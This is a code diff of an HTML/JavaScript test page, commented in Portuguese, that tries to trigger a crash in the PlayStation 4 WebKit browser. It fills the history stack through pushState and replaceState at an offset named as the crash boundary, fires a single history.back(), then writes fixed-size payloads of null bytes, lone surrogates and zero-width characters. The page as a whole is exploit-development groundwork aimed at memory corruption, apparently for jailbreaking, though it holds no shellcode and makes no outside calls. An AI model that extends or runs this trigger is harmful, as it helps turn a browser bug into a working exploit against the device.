@@ -2,64 +2,153 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Async History Crash Locator</title>
+<title>PS4 WebKit – STEP 5 (Post-back Control)</title>
+<style>
+body { font-family: monospace; background:#111; color:#ddd; }
+button { margin:6px; padding:8px; }
+#log { white-space: pre-wrap; border:1px solid #333; padding:8px; height:380px; overflow:auto; }
+.warn { color:#ffb000; }
+.crit { color:#ff5555; }
+.ok { color:#66ff66; }
+</style>
 </head>
 <body>
 
-<h1>PS4 WebKit – Passo 4 (Async)</h1>
-<button onclick="start()">RUN TEST</button>
+<h2>STEP 5 – Freeze Heap + Post-back Content Control</h2>
+<p>
+Objetivo: disparar <b>UM</b> <code>history.back()</code>, congelar layout e variar <b>somente conteúdo</b>
+com <b>tamanho fixo</b> após o back.
+</p>
 
-<pre id="log"></pre>
+<button onclick="runOnce()">RUN (Single Back)</button>
+<button onclick="runMatrix()">RUN Matrix (All Patterns)</button>
+<button onclick="clearLog()">Clear</button>
+
+<div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m) {
-    logEl.textContent += m + "\n";
+function log(m, cls="") {
+  const t = new Date().toLocaleTimeString();
+  logEl.innerHTML += `[${t}] ${m}\n`;
+  logEl.scrollTop = logEl.scrollHeight;
 }
+function clearLog(){ logEl.textContent=""; }
 
+/* ======= PARAMETRIZAÇÃO CRÍTICA ======= */
+// Ajuste APENAS se necessário
 const BASE = 977;
-const DELTA = 14461;
-const MAX = 50;
+const OFFSET_SAFE = 14460;     // conhecido como safe
+const OFFSET_CRASH = 14461;    // limite
+const FIXED_SIZE = BASE + OFFSET_CRASH; // tamanho FIXO pós-back
+const PRE_ITERS = 30;          // pressão antes do back
+const POST_ITERS = 20;         // repetições após back (sem variar tamanho)
 
-let i = 0;
-let size = BASE;
-
-function step() {
-    if (i >= MAX) {
-        log("[*] Finalizado sem crash");
-        return;
-    }
-
-    log("\n[ITER " + i + "] size=" + size);
-
-    const payload = "A".repeat(size);
-
-    log(" pushState");
-    history.pushState({i}, "", "#" + payload);
-
-    log(" replaceState");
-    history.replaceState({}, "", "#" + payload.slice(0, payload.length >> 1));
-
-    if (i % 5 === 0) {
-        log(" history.back (async)");
-        history.back();
-    }
-
-    i++;
-    size += DELTA;
-
-    // CRÍTICO: permite o WebKit processar navegação
-    setTimeout(step, 0);
+/* ======= PADRÕES DE CONTEÚDO (mesmo tamanho lógico) ======= */
+function pattern_A(){ return "A".repeat(FIXED_SIZE); }
+function pattern_B(){ return "B".repeat(FIXED_SIZE); }
+function pattern_ABAB(){
+  return "AB".repeat(Math.floor(FIXED_SIZE/2)) + (FIXED_SIZE%2?"A":"");
+}
+function pattern_UTF16_NULL(){
+  let s="";
+  for(let i=0;i<FIXED_SIZE;i++) s += (i%4===0) ? "\u0000" : "A";
+  return s;
+}
+function pattern_SURROGATE(){
+  // mistura de surrogate alto (tamanho lógico constante)
+  let s="";
+  for(let i=0;i<FIXED_SIZE;i++) s += (i%3===0) ? "\uD800" : "A";
+  return s;
+}
+function pattern_MIX(){
+  let s="";
+  const p=["A","B","\u0000","\u200B"];
+  for(let i=0;i<FIXED_SIZE;i++) s+=p[i%p.length];
+  return s;
 }
 
-function start() {
-    log("[*] Teste iniciado");
-    i = 0;
-    size = BASE;
-    step();
+const PATTERNS = [
+  {name:"ALL_A", fn:pattern_A},
+  {name:"ALL_B", fn:pattern_B},
+  {name:"ABAB", fn:pattern_ABAB},
+  {name:"UTF16_NULL", fn:pattern_UTF16_NULL},
+  {name:"SURROGATE", fn:pattern_SURROGATE},
+  {name:"MIX", fn:pattern_MIX}
+];
+
+/* ======= FASE 1: PRESSÃO CONTROLADA ======= */
+function prePressure(){
+  log("Phase 1: pre-pressure (push/replace only)", "warn");
+  let size = BASE;
+  for(let i=0;i<PRE_ITERS;i++){
+    const p = "A".repeat(size);
+    history.pushState({}, "", "#"+p);
+    history.replaceState({}, "", "#"+p.slice(0, p.length>>1));
+    size += OFFSET_CRASH;
+  }
+  log("Phase 1 done.", "ok");
 }
 
-log("Loaded.");
+/* ======= FASE 2: BACK ÚNICO ======= */
+async function singleBack(){
+  log("Phase 2: SINGLE history.back() (trigger)", "crit");
+  history.back();
+  // dá tempo para o WebKit processar a navegação
+  await new Promise(r=>setTimeout(r, 250));
+  log("Back processed.", "ok");
+}
+
+/* ======= FASE 3: PÓS-BACK (tamanho FIXO, conteúdo variável) ======= */
+async function postBackRun(label, makePayload){
+  log(`Phase 3: post-back run with pattern = ${label}`, "warn");
+  const payload = makePayload(); // tamanho FIXO
+  log(`Payload length (logical) = ${payload.length}`, "ok");
+
+  for(let i=0;i<POST_ITERS;i++){
+    history.pushState({}, "", "#"+payload);
+    history.replaceState({}, "", "#"+payload);
+    // micro delay para reduzir ruído
+    await new Promise(r=>setTimeout(r, 30));
+    log(`post[${i}] ok`);
+  }
+  log(`Pattern ${label} completed WITHOUT immediate crash.`, "ok");
+}
+
+/* ======= EXECUÇÕES ======= */
+async function runOnce(){
+  clearLog();
+  log("=== STEP 5 RUN (Single Pattern) ===", "crit");
+  try{
+    prePressure();
+    await singleBack();
+    // padrão base primeiro
+    await postBackRun("ALL_A", pattern_A);
+    log("Run finished.", "ok");
+  }catch(e){
+    log("Exception: "+e, "crit");
+  }
+}
+
+async function runMatrix(){
+  clearLog();
+  log("=== STEP 5 RUN MATRIX (All Patterns) ===", "crit");
+  try{
+    prePressure();
+    await singleBack();
+    for(const p of PATTERNS){
+      await postBackRun(p.name, p.fn);
+      // separador
+      log("----", "warn");
+      await new Promise(r=>setTimeout(r, 120));
+    }
+    log("Matrix finished.", "ok");
+  }catch(e){
+    log("Exception: "+e, "crit");
+  }
+}
+
+log("Loaded. Known boundary: 977 + 14461. STEP 5 ready.", "ok");
 </script>
 
 </body>
